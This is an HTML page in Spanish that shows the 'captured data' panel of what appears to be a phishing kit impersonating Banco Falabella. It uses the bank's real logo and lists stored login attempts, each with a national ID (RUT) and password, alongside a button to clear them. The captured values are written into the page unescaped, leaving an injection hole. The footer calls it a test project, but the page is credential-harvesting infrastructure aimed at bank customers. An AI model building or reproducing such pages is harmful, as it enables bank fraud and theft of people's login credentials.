<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Datos Capturados - Solo para ti</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 40px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            padding-bottom: 20px;
            border-bottom: 1px solid #eee;
            margin-bottom: 30px;
        }
        .header img {
            width: 180px;
        }
        h1 {
            color: #009e4c;
            font-size: 24px;
        }
        .datos {
            background: #fff3e0;
            padding: 20px;
            border-radius: 8px;
            border-left: 4px solid #ff9800;
            margin: 15px 0;
        }
        .datos strong {
            color: #e65100;
        }
        .clear-btn {
            background: #d32f2f;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        .clear-btn:hover {
            background: #b71c1c;
        }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #666;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <img src="https://www.bancofalabella.cl/_next/static/media/logo.686cc6de.svg" alt="Banco Falabella">
            <h1>Datos Capturados (Solo tú)</h1>
        </div>

        <button class="clear-btn" onclick="limpiarDatos()">Limpiar Todos los Datos</button>

        <div id="lista-datos">
            <!-- Aquí se muestran los datos guardados -->
        </div>

        <div class="footer">
            Solo visible para el administrador | Proyecto de prueba
        </div>
    </div>

    <script>
        function mostrarDatos() {
            const intentos = JSON.parse(localStorage.getItem('intentosLogin') || '[]');
            const lista = document.getElementById('lista-datos');

            if (intentos.length === 0) {
                lista.innerHTML = '<p style="color:#999; text-align:center;">No hay datos capturados aún.</p>';
                return;
            }

            lista.innerHTML = '';
            intentos.forEach((item, index) => {
                const div = document.createElement('div');
                div.className = 'datos';
                div.innerHTML = `
                    <strong>Intento #${index + 1}</strong> - ${item.fecha}<br>
                    <strong>RUT:</strong> ${item.rut}<br>
                    <strong>Clave:</strong> ${item.clave}
                `;
                lista.appendChild(div);
            });
        }

        function limpiarDatos() {
            if (confirm('¿Seguro que quieres borrar todos los datos?')) {
                localStorage.removeItem('intentosLogin');
                mostrarDatos();
            }
        }

        // Mostrar al cargar
        mostrarDatos();
    </script>

</body>
</html>
